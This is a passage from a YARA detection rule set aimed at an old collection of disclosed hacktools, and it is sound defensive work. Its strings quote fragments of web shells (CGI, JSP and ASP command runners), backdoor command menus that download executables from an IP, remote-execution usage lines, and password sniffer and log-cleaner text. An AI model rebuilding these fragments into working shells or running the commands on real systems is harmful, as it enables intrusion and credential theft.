      $x1 = "WinEggDrop Shell Congirator" fullword ascii
   condition:
      5 of ($s*) or $x1
}

rule sig_238_letmein {
   meta:
      description = "Disclosed hacktool set (old stuff) - file letmein.exe"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      date = "23.11.14"
      score = 60
      hash = "74d223a56f97b223a640e4139bb9b94d8faa895d"
      id = "5dba055f-1928-534a-8d0e-11dda56d93b7"
   strings:
      $s1 = "Error get globalgroup memebers: NERR_InvalidComputer" fullword ascii
      $s6 = "Error get users from server!" fullword ascii
      $s7 = "get in nt by name and null" fullword ascii
      $s16 = "get something from nt, hold by killusa." fullword ascii
   condition:
      all of them
}

rule sig_238_token {
   meta:
      description = "Disclosed hacktool set (old stuff) - file token.exe"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      date = "23.11.14"
      score = 60
      hash = "c52bc6543d4281aa75a3e6e2da33cfb4b7c34b14"
      id = "9d0ac24b-2078-5455-8d9e-a642c71f7b2d"
   strings:
      $s0 = "Logon.exe" fullword ascii
      $s1 = "Domain And User:" fullword ascii
      $s2 = "PID=Get Addr$(): One" fullword ascii
      $s3 = "Process " fullword ascii
      $s4 = "psapi.dllK" fullword ascii
   condition:
      all of them
}

rule sig_238_TELNET {
   meta:
      description = "Disclosed hacktool set (old stuff) - file TELNET.EXE from Windows ME"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      date = "23.11.14"
      score = 60
      hash = "50d02d77dc6cc4dc2674f90762a2622e861d79b1"
      id = "fae22e0f-2f69-5dc6-984c-2c07530ad11a"
   strings:
      $s0 = "TELNET [host [port]]" fullword wide
      $s2 = "TELNET.EXE" fullword wide
      $s4 = "Microsoft(R) Windows(R) Millennium Operating System" fullword wide
      $s14 = "Software\\Microsoft\\Telnet" fullword wide
   condition:
      all of them
}

rule snifferport {
   meta:
      description = "Disclosed hacktool set (old stuff) - file snifferport.exe"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      date = "23.11.14"
      score = 60
      hash = "d14133b5eaced9b7039048d0767c544419473144"
      id = "5b903344-18d2-5d3d-be66-7260a5f3ea4b"
   strings:
      $s0 = "iphlpapi.DLL" fullword ascii
      $s5 = "ystem\\CurrentCorolSet\\" ascii
      $s11 = "Port.TX" fullword ascii
      $s12 = "32Next" fullword ascii
      $s13 = "V1.2 B" fullword ascii
   condition:
      all of them
}

rule sig_238_webget {
   meta:
      description = "Disclosed hacktool set (old stuff) - file webget.exe"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      date = "23.11.14"
      score = 60
      hash = "36b5a5dee093aa846f906bbecf872a4e66989e42"
      id = "b03a2463-94fe-5050-8e3d-269101a03cda"
   strings:
      $s0 = "Packed by exe32pack" ascii
      $s1 = "GET A HTTP/1.0" fullword ascii
      $s2 = " error " fullword ascii
      $s13 = "Downloa" ascii
   condition:
      all of them
}

rule XYZCmd_zip_Folder_XYZCmd {
   meta:
      description = "Disclosed hacktool set (old stuff) - file XYZCmd.exe"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      date = "23.11.14"
      score = 60
      hash = "bbea5a94950b0e8aab4a12ad80e09b630dd98115"
      id = "c3d70b93-1d53-5403-bd22-d1e4bad5042b"
   strings:
      $s0 = "Executes Command Remotely" fullword wide
      $s2 = "XYZCmd.exe" fullword wide
      $s6 = "No Client Software" fullword wide
      $s19 = "XYZCmd V1.0 For NT S" fullword ascii
   condition:
      all of them
}

rule ASPack_Chinese {
   meta:
      description = "Disclosed hacktool set (old stuff) - file ASPack Chinese.ini"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      date = "23.11.14"
      score = 60
      hash = "02a9394bc2ec385876c4b4f61d72471ac8251a8e"
      id = "ac821117-7534-5dec-9477-25be87361900"
   strings:
      $s0 = "= Click here if you want to get your registered copy of ASPack" fullword ascii
      $s1 = ";  For beginning of translate - copy english.ini into the yourlanguage.ini" fullword ascii
      $s2 = "E-Mail:                      shinlan@km169.net" fullword ascii
      $s8 = ";  Please, translate text only after simbol '='" fullword ascii
      $s19 = "= Compress with ASPack" fullword ascii
   condition:
      all of them
}

rule aspbackdoor_EDIR {
   meta:
      description = "Disclosed hacktool set (old stuff) - file EDIR.ASP"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      date = "23.11.14"
      score = 60
      hash = "03367ad891b1580cfc864e8a03850368cbf3e0bb"
      id = "0895091a-b620-5746-8245-d44716ec2bbe"
   strings:
      $s1 = "response.write \"<a href='index.asp'>" fullword ascii
      $s3 = "if Request.Cookies(\"password\")=\"" ascii
      $s6 = "whichdir=server.mappath(Request(\"path\"))" fullword ascii
      $s7 = "Set fs = CreateObject(\"Scripting.FileSystemObject\")" fullword ascii
      $s19 = "whichdir=Request(\"path\")" fullword ascii
   condition:
      all of them
}

rule ByPassFireWall_zip_Folder_Ie {
   meta:
      description = "Disclosed hacktool set (old stuff) - file Ie.dll"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      date = "23.11.14"
      score = 60
      hash = "d1b9058f16399e182c9b78314ad18b975d882131"
      id = "7bd10fa1-be2d-5882-b4c7-b696612343e5"
   strings:
      $s0 = "d:\\documents and settings\\loveengeng\\desktop\\source\\bypass\\lcc\\ie.dll" fullword ascii
      $s1 = "LOADER ERROR" fullword ascii
      $s5 = "The procedure entry point %s could not be located in the dynamic link library %s" fullword ascii
      $s7 = "The ordinal %u could not be located in the dynamic link library %s" fullword ascii
   condition:
      all of them
}

rule EditKeyLogReadMe {
   meta:
      description = "Disclosed hacktool set (old stuff) - file EditKeyLogReadMe.txt"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      date = "23.11.14"
      score = 60
      hash = "dfa90540b0e58346f4b6ea12e30c1404e15fbe5a"
      id = "db083c04-9e5c-5cfd-b4d4-eecf28191b6b"
   strings:
      $s0 = "editKeyLog.exe KeyLog.exe," fullword ascii
      $s1 = "WinEggDrop.DLL" fullword ascii
      $s2 = "nc.exe" fullword ascii
      $s3 = "KeyLog.exe" fullword ascii
      $s4 = "EditKeyLog.exe" fullword ascii
      $s5 = "wineggdrop" fullword ascii
   condition:
      3 of them
}

rule PassSniffer_zip_Folder_readme {
   meta:
      description = "Disclosed hacktool set (old stuff) - file readme.txt"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      date = "23.11.14"
      score = 60
      hash = "a52545ae62ddb0ea52905cbb61d895a51bfe9bcd"
      id = "f5965aa8-0f78-56fd-8e3e-6dc013942cb3"
   strings:
      $s0 = "PassSniffer.exe" fullword ascii
      $s1 = "POP3/FTP Sniffer" fullword ascii
      $s2 = "Password Sniffer V1.0" fullword ascii
   condition:
      1 of them
}

rule sig_238_gina {
   meta:
      description = "Disclosed hacktool set (old stuff) - file gina.reg"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      date = "23.11.14"
      score = 60
      hash = "324acc52566baf4afdb0f3e4aaf76e42899e0cf6"
      id = "85c19493-e6d4-55e8-8526-6817243e90cf"
   strings:
      $s0 = "\"gina\"=\"gina.dll\"" fullword ascii
      $s1 = "REGEDIT4" fullword ascii
      $s2 = "[HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon]" fullword ascii
   condition:
      all of them
}

rule splitjoin {
   meta:
      description = "Disclosed hacktool set (old stuff) - file splitjoin.exe"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      date = "23.11.14"
      score = 60
      hash = "e4a9ef5d417038c4c76b72b5a636769a98bd2f8c"
      id = "2f1a69cd-34b3-5af0-a054-fe19d9becb25"
   strings:
      $s0 = "Not for distribution without the authors permission" fullword wide
      $s2 = "Utility to split and rejoin files.0" fullword wide
      $s5 = "Copyright (c) Angus Johnson 2001-2002" fullword wide
      $s19 = "SplitJoin" fullword wide
   condition:
      all of them
}

rule EditKeyLog {
   meta:
      description = "Disclosed hacktool set (old stuff) - file EditKeyLog.exe"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      date = "23.11.14"
      score = 60
      hash = "a450c31f13c23426b24624f53873e4fc3777dc6b"
      id = "db083c04-9e5c-5cfd-b4d4-eecf28191b6b"
   strings:
      $s1 = "Press Any Ke" fullword ascii
      $s2 = "Enter 1 O" fullword ascii
      $s3 = "Bon >0 & <65535L" fullword ascii
      $s4 = "--Choose " fullword ascii
   condition:
      all of them
}

rule PassSniffer {
   meta:
      description = "Disclosed hacktool set (old stuff) - file PassSniffer.exe"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      date = "23.11.14"
      score = 60
      hash = "dcce4c577728e8edf7ed38ac6ef6a1e68afb2c9f"
      id = "f5965aa8-0f78-56fd-8e3e-6dc013942cb3"
   strings:
      $s2 = "Sniff" fullword ascii
      $s3 = "GetLas" fullword ascii
      $s4 = "VersionExA" fullword ascii
      $s10 = " Only RuntUZ" fullword ascii
      $s12 = "emcpysetprintf\\" ascii
      $s13 = "WSFtartup" fullword ascii
   condition:
      all of them
}

rule aspfile2 {
   meta:
      description = "Disclosed hacktool set (old stuff) - file aspfile2.asp"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      date = "23.11.14"
      score = 60
      hash = "14efbc6cb01b809ad75a535d32b9da4df517ff29"
      id = "42bbcc16-a6d7-53d7-8651-1a28c6b26ee8"
   strings:
      $s0 = "response.write \"command completed success!\" " fullword ascii
      $s1 = "for each co in foditems " fullword ascii
      $s3 = "<input type=text name=text6 value=\"<%= szCMD6 %>\"><br> " fullword ascii
      $s19 = "<title>Hello! Welcome </title>" fullword ascii
   condition:
      all of them
}

rule UnPack_rar_Folder_InjectT {
   meta:
      description = "Disclosed hacktool set (old stuff) - file InjectT.exe"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      date = "23.11.14"
      score = 60
      hash = "80f39e77d4a34ecc6621ae0f4d5be7563ab27ea6"
      id = "cc7d1a36-1214-5a14-8589-9eb2339a8700"
   strings:
      $s0 = "%s -Install                          -->To Install The Service" fullword ascii
      $s1 = "Explorer.exe" fullword ascii
      $s2 = "%s -Start                            -->To Start The Service" fullword ascii
      $s3 = "%s -Stop                             -->To Stop The Service" fullword ascii
      $s4 = "The Port Is Out Of Range" fullword ascii
      $s7 = "Fail To Set The Port" fullword ascii
      $s11 = "\\psapi.dll" ascii
      $s20 = "TInject.Dll" fullword ascii

      $x1 = "Software\\Microsoft\\Internet Explorer\\WinEggDropShell" fullword ascii
      $x2 = "injectt.exe" fullword ascii
   condition:
      ( 1 of ($x*) ) and ( 3 of ($s*) )
}

rule Jc_WinEggDrop_Shell {
   meta:
      description = "Disclosed hacktool set (old stuff) - file Jc.WinEggDrop Shell.txt"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      date = "23.11.14"
      score = 60
      hash = "820674b59f32f2cf72df50ba4411d7132d863ad2"
      id = "219df3a1-fe1c-5d33-ab3e-1b3cbd104c9e"
   strings:
      $s0 = "Sniffer.dll" fullword ascii
      $s4 = ":Execute net.exe user Administrator pass" fullword ascii
      $s5 = "Fport.exe or mport.exe " fullword ascii
      $s6 = ":Password Sniffering Is Running |Not Running " fullword ascii
      $s9 = ": The Terminal Service Port Has Been Set To NewPort" fullword ascii
      $s15 = ": Del www.exe                   " fullword ascii
      $s20 = ":Dir *.exe                    " fullword ascii
   condition:
      2 of them
}

rule aspbackdoor_asp1 {
   meta:
      description = "Disclosed hacktool set (old stuff) - file asp1.txt"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      date = "23.11.14"
      score = 60
      hash = "9ef9f34392a673c64525fcd56449a9fb1d1f3c50"
      id = "fa5128c5-efd5-55dd-880a-2952942e2035"
   strings:
      $s0 = "param = \"driver={Microsoft Access Driver (*.mdb)}\" " fullword ascii
      $s1 = "conn.Open param & \";dbq=\" & Server.MapPath(\"scjh.mdb\") " fullword ascii
      $s6 = "set rs=conn.execute (sql)%> " fullword ascii
      $s7 = "<%set Conn = Server.CreateObject(\"ADODB.Connection\") " fullword ascii
      $s10 = "<%dim ktdh,scph,scts,jhqtsj,yhxdsj,yxj,rwbh " fullword ascii
      $s15 = "sql=\"select * from scjh\" " fullword ascii
   condition:
      all of them
}

rule QQ_zip_Folder_QQ {
   meta:
      description = "Disclosed hacktool set (old stuff) - file QQ.exe"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      date = "23.11.14"
      score = 60
      hash = "9f8e3f40f1ac8c1fa15a6621b49413d815f46cfb"
      id = "30da6292-f670-5b73-985a-3028e20607be"
   strings:
      $s0 = "EMAIL:haoq@neusoft.com" fullword wide
      $s1 = "EMAIL:haoq@neusoft.com" fullword wide
      $s4 = "QQ2000b.exe" fullword wide
      $s5 = "haoq@neusoft.com" fullword ascii
      $s9 = "QQ2000b.exe" fullword ascii
      $s10 = "\\qq2000b.exe" ascii
      $s12 = "WINDSHELL STUDIO[WINDSHELL " fullword wide
      $s17 = "SOFTWARE\\HAOQIANG\\" ascii
   condition:
      5 of them
}

rule UnPack_rar_Folder_TBack {
   meta:
      description = "Disclosed hacktool set (old stuff) - file TBack.DLL"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      date = "23.11.14"
      score = 60
      hash = "30fc9b00c093cec54fcbd753f96d0ca9e1b2660f"
      id = "f672f987-0d43-53df-8338-084907b6da16"
   strings:
      $s0 = "Redirect SPort RemoteHost RPort       -->Port Redirector" fullword ascii
      $s1 = "http://IP/a.exe a.exe                 -->Download A File" fullword ascii
      $s2 = "StopSniffer                           -->Stop Pass Sniffer" fullword ascii
      $s3 = "TerminalPort Port                     -->Set New Terminal Port" fullword ascii
      $s4 = "Example: Http://12.12.12.12/a.exe abc.exe" fullword ascii
      $s6 = "Create Password Sniffering Thread Successfully. Status:Logging" fullword ascii
      $s7 = "StartSniffer NIC                      -->Start Sniffer" fullword ascii
      $s8 = "Shell                                 -->Get A Shell" fullword ascii
      $s11 = "DeleteService ServiceName             -->Delete A Service" fullword ascii
      $s12 = "Disconnect ThreadNumber|All           -->Disconnect Others" fullword ascii
      $s13 = "Online                                -->List All Connected IP" fullword ascii
      $s15 = "Getting The UserName(%c%s%c)-->ID(0x%s) Successfully" fullword ascii
      $s16 = "Example: Set REG_SZ Test Trojan.exe" fullword ascii
      $s18 = "Execute Program                       -->Execute A Program" fullword ascii
      $s19 = "Reboot                                -->Reboot The System" fullword ascii
      $s20 = "Password Sniffering Is Not Running" fullword ascii
   condition:
      4 of them
}

rule sig_238_cmd_2 {
   meta:
      description = "Disclosed hacktool set (old stuff) - file cmd.jsp"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      date = "23.11.14"
      score = 60
      hash = "be4073188879dacc6665b6532b03db9f87cfc2bb"
      id = "5fae3c4a-aeeb-5e02-9071-3980a39a19a9"
   strings:
      $s0 = "Process child = Runtime.getRuntime().exec(" ascii
      $s1 = "InputStream in = child.getInputStream();" fullword ascii
      $s2 = "String cmd = request.getParameter(\"" ascii
      $s3 = "while ((c = in.read()) != -1) {" fullword ascii
      $s4 = "<%@ page import=\"java.io.*\" %>" fullword ascii
   condition:
      all of them
}

rule RangeScan {
   meta:
      description = "Disclosed hacktool set (old stuff) - file RangeScan.exe"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      date = "23.11.14"
      score = 60
      hash = "bace2c65ea67ac4725cb24aa9aee7c2bec6465d7"
      id = "143d9e1e-41e2-579a-beee-30da2cf068f7"
   strings:
      $s0 = "RangeScan.EXE" fullword wide
      $s4 = "<br><p align=\"center\"><b>RangeScan " fullword ascii
      $s9 = "Produced by isn0" fullword ascii
      $s10 = "RangeScan" fullword wide
      $s20 = "%d-%d-%d %d:%d:%d" fullword ascii
   condition:
      3 of them
}

rule XYZCmd_zip_Folder_Readme {
   meta:
      description = "Disclosed hacktool set (old stuff) - file Readme.txt"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      date = "23.11.14"
      score = 60
      hash = "967cb87090acd000d22e337b8ce4d9bdb7c17f70"
      id = "cee0f8c3-f947-50a5-ae8c-4ce83ef5e433"
   strings:
      $s3 = "3.xyzcmd \\\\RemoteIP /user:Administrator /pwd:1234 /nowait trojan.exe" fullword ascii
      $s20 = "XYZCmd V1.0" fullword ascii
   condition:
      all of them
}

rule ByPassFireWall_zip_Folder_Inject {
   meta:
      description = "Disclosed hacktool set (old stuff) - file Inject.exe"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      date = "23.11.14"
      score = 60
      hash = "34f564301da528ce2b3e5907fd4b1acb7cb70728"
      id = "bb31dc53-f3c1-5f8b-84f9-c231a4e1675b"
   strings:
      $s6 = "Fail To Inject" fullword ascii
      $s7 = "BtGRemote Pro; V1.5 B/{" fullword ascii
      $s11 = " Successfully" fullword ascii
   condition:
      all of them
}

rule sig_238_sqlcmd {
   meta:
      description = "Disclosed hacktool set (old stuff) - file sqlcmd.exe"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      date = "23.11.14"
      score = 40
      hash = "b6e356ce6ca5b3c932fa6028d206b1085a2e1a9a"
      id = "0efdfac7-5a89-5251-b583-12b0a58c48ff"
   strings:
      $s0 = "Permission denial to EXEC command.:(" ascii
      $s3 = "by Eyas<cooleyas@21cn.com>" fullword ascii
      $s4 = "Connect to %s MSSQL server success.Enjoy the shell.^_^" fullword ascii
      $s5 = "Usage: %s <host> <uid> <pwd>" fullword ascii
      $s6 = "SqlCmd2.exe Inside Edition." fullword ascii
      $s7 = "Http://www.patching.net  2000/12/14" fullword ascii
      $s11 = "Example: %s 192.168.0.1 sa \"\"" fullword ascii
   condition:
      4 of them
}

rule ASPack_ASPACK {
   meta:
      description = "Disclosed hacktool set (old stuff) - file ASPACK.EXE"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      date = "23.11.14"
      score = 60
      hash = "c589e6fd48cfca99d6335e720f516e163f6f3f42"
      id = "ca9a25f9-a94b-5e10-b935-c6e2d38d999c"
   strings:
      $s0 = "ASPACK.EXE" fullword wide
      $s5 = "CLOSEDFOLDER" fullword wide
      $s10 = "ASPack compressor" fullword wide
   condition:
      all of them
}

rule sig_238_2323 {
   meta:
      description = "Disclosed hacktool set (old stuff) - file 2323.exe"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      date = "23.11.14"
      score = 60
      hash = "21812186a9e92ee7ddc6e91e4ec42991f0143763"
      id = "445f6a49-51e6-5eb8-ae08-e5989aafb6c4"
   strings:
      $s0 = "port - Port to listen on, defaults to 2323" fullword ascii
      $s1 = "Usage: srvcmd.exe [/h] [port]" fullword ascii
      $s3 = "Failed to execute shell" fullword ascii
      $s5 = "/h   - Hide Window" fullword ascii
      $s7 = "Accepted connection from client at %s" fullword ascii
      $s9 = "Error %d: %s" fullword ascii
   condition:
      all of them
}

rule Jc_ALL_WinEggDropShell_rar_Folder_Install_2 {
   meta:
      description = "Disclosed hacktool set (old stuff) - file Install.exe"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      date = "23.11.14"
      score = 60
      hash = "95866e917f699ee74d4735300568640ea1a05afd"
      id = "ebfc8e53-328c-5deb-bf9b-e0270f171c68"
   strings:
      $s1 = "http://go.163.com/sdemo" fullword wide
      $s2 = "Player.tmp" fullword ascii
      $s3 = "Player.EXE" fullword wide
      $s4 = "mailto:sdemo@263.net" fullword ascii
      $s5 = "S-Player.exe" fullword ascii
      $s9 = "http://www.BaiXue.net (" wide
   condition:
      all of them
}

rule sig_238_TFTPD32 {
   meta:
      description = "Disclosed hacktool set (old stuff) - file TFTPD32.EXE"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      date = "23.11.14"
      score = 60
      hash = "5c5f8c1a2fa8c26f015e37db7505f7c9e0431fe8"
      id = "071fba15-affe-539a-bcc0-c14943fff51a"
   strings:
      $s0 = " http://arm.533.net" fullword ascii
      $s1 = "Tftpd32.hlp" fullword ascii
      $s2 = "Timeouts and Ports should be numerical and can not be 0" fullword ascii
      $s3 = "TFTPD32 -- " fullword wide
      $s4 = "%d -- %s" fullword ascii
      $s5 = "TIMEOUT while waiting for Ack block %d. file <%s>" fullword ascii
      $s12 = "TftpPort" fullword ascii
      $s13 = "Ttftpd32BackGround" fullword ascii
      $s17 = "SOFTWARE\\TFTPD32" fullword ascii
   condition:
      all of them
}

rule sig_238_iecv {
   meta:
      description = "Disclosed hacktool set (old stuff) - file iecv.exe"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      date = "23.11.14"
      score = 60
      hash = "6e6e75350a33f799039e7a024722cde463328b6d"
      id = "08126db3-267b-5289-b562-40bc264f6e3e"
   strings:
      $s1 = "Edit The Content Of Cookie " fullword wide
      $s3 = "Accessories\\wordpad.exe" fullword ascii
      $s4 = "gorillanation.com" fullword ascii
      $s5 = "Before editing the content of a cookie, you should close all windows of Internet" ascii
      $s12 = "http://nirsoft.cjb.net" fullword ascii
   condition:
      all of them
}

rule Antiy_Ports_1_21 {
   meta:
      description = "Disclosed hacktool set (old stuff) - file Antiy Ports 1.21.exe"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      date = "23.11.14"
      score = 60
      hash = "ebf4bcc7b6b1c42df6048d198cbe7e11cb4ae3f0"
      id = "eb53fc91-4dec-5416-a2c7-1e8256297886"
   strings:
      $s0 = "AntiyPorts.EXE" fullword wide
      $s7 = "AntiyPorts MFC Application" fullword wide
      $s20 = " @Stego:" fullword ascii
   condition:
      all of them
}

rule perlcmd_zip_Folder_cmd {
   meta:
      description = "Disclosed hacktool set (old stuff) - file cmd.cgi"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      date = "23.11.14"
      score = 60
      hash = "21b5dc36e72be5aca5969e221abfbbdd54053dd8"
      id = "19e4eca0-bd56-57af-afd2-ee2fc5c7c0df"
   strings:
      $s0 = "syswrite(STDOUT, \"Content-type: text/html\\r\\n\\r\\n\", 27);" fullword ascii
      $s1 = "s/%20/ /ig;" fullword ascii
      $s2 = "syswrite(STDOUT, \"\\r\\n</PRE></HTML>\\r\\n\", 17);" fullword ascii
      $s4 = "open(STDERR, \">&STDOUT\") || die \"Can't redirect STDERR\";" fullword ascii
      $s5 = "$_ = $ENV{QUERY_STRING};" fullword ascii
      $s6 = "$execthis = $_;" fullword ascii
      $s7 = "system($execthis);" fullword ascii
      $s12 = "s/%2f/\\//ig;" fullword ascii
   condition:
      6 of them
}

rule aspbackdoor_asp3 {
   meta:
      description = "Disclosed hacktool set (old stuff) - file asp3.txt"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      date = "23.11.14"
      score = 60
      hash = "e5588665ca6d52259f7d9d0f13de6640c4e6439c"
      id = "ed86e829-449b-5088-a105-f1fe79547540"
   strings:
      $s0 = "<form action=\"changepwd.asp\" method=\"post\"> " fullword ascii
      $s1 = "  Set oUser = GetObject(\"WinNT://ComputerName/\" & UserName) " fullword ascii
      $s2 = "    value=\"<%=Request.ServerVariables(\"LOGIN_USER\")%>\"> " fullword ascii
      $s14 = " Windows NT " fullword ascii
      $s16 = " WIndows 2000 " fullword ascii
      $s18 = "OldPwd = Request.Form(\"OldPwd\") " fullword ascii
      $s19 = "NewPwd2 = Request.Form(\"NewPwd2\") " fullword ascii
      $s20 = "NewPwd1 = Request.Form(\"NewPwd1\") " fullword ascii
   condition:
      all of them
}

rule sig_238_FPipe {
   meta:
      description = "Disclosed hacktool set (old stuff) - file FPipe.exe"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      date = "23.11.14"
      score = 60
      hash = "41d57d356098ff55fe0e1f0bcaa9317df5a2a45c"
      id = "0b2f11d9-a919-5790-8724-d2f028e4fa3a"
   strings:
      $s0 = "made to port 80 of the remote machine at 192.168.1.101 with the" fullword ascii
      $s1 = "Unable to resolve hostname \"%s\"" fullword ascii
      $s2 = "source port for that outbound connection being set to 53 also." fullword ascii
      $s3 = " -s    - outbound source port number" fullword ascii
      $s5 = "http://www.foundstone.com" fullword ascii
      $s20 = "Attempting to connect to %s port %d" fullword ascii
   condition:
      all of them
}

rule sig_238_concon {
   meta:
      description = "Disclosed hacktool set (old stuff) - file concon.com"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      date = "23.11.14"
      score = 60
      hash = "816b69eae66ba2dfe08a37fff077e79d02b95cc1"
      id = "ca7862cc-1053-5fce-a569-6ecc069314df"
   strings:
      $s0 = "Usage: concon \\\\ip\\sharename\\con\\con" fullword ascii
   condition:
      all of them
}

rule aspbackdoor_regdll {
   meta:
      description = "Disclosed hacktool set (old stuff) - file regdll.asp"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      date = "23.11.14"
      score = 60
      hash = "5c5e16a00bcb1437bfe519b707e0f5c5f63a488d"
      id = "37096c50-68d0-5412-847a-022062a5ff2a"
   strings:
      $s1 = "exitcode = oShell.Run(\"c:\\WINNT\\system32\\regsvr32.exe /u/s \" & strFile, 0, " ascii
      $s3 = "oShell.Run \"c:\\WINNT\\system32\\regsvr32.exe /u/s \" & strFile, 0, False" fullword ascii
      $s4 = "EchoB(\"regsvr32.exe exitcode = \" & exitcode)" fullword ascii
      $s5 = "Public Property Get oFS()" fullword ascii
   condition:
      all of them
}

rule CleanIISLog {
   meta:
      description = "Disclosed hacktool set (old stuff) - file CleanIISLog.exe"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      date = "23.11.14"
      score = 60
      hash = "827cd898bfe8aa7e9aaefbe949d26298f9e24094"
      id = "439726c6-3262-59ef-9a54-7dcd98cf924d"
   strings:
      $s1 = "CleanIP - Specify IP Address Which You Want Clear." fullword ascii
      $s2 = "LogFile - Specify Log File Which You Want Process." fullword ascii
      $s8 = "CleanIISLog Ver" fullword ascii
      $s9 = "msftpsvc" fullword ascii
      $s10 = "Fatal Error: MFC initialization failed" fullword ascii
      $s11 = "Specified \"ALL\" Will Process All Log Files." fullword ascii
      $s12 = "Specified \".\" Will Clean All IP Record." fullword ascii
      $s16 = "Service %s Stopped." fullword ascii
      $s20 = "Process Log File %s..." fullword ascii
   condition:
      5 of them
}

rule sqlcheck {
   meta:
      description = "Disclosed hacktool set (old stuff) - file sqlcheck.exe"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      date = "23.11.14"
      score = 60
      hash = "5a5778ac200078b627db84fdc35bf5bcee232dc7"
      id = "a72d38ef-b2e7-5051-8538-724d9e95fa6a"
   strings:
      $s0 = "Power by eyas<cooleyas@21cn.com>" fullword ascii
      $s3 = "\\ipc$ \"\" /user:\"\"" fullword ascii
      $s4 = "SQLCheck can only scan a class B network. Try again." fullword ascii
      $s14 = "Example: SQLCheck 192.168.0.1 192.168.0.254" fullword ascii
      $s20 = "Usage: SQLCheck <StartIP> <EndIP>" fullword ascii
   condition:
      3 of them
}

rule sig_238_RunAsEx {
   meta:
      description = "Disclosed hacktool set (old stuff) - file RunAsEx.exe"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
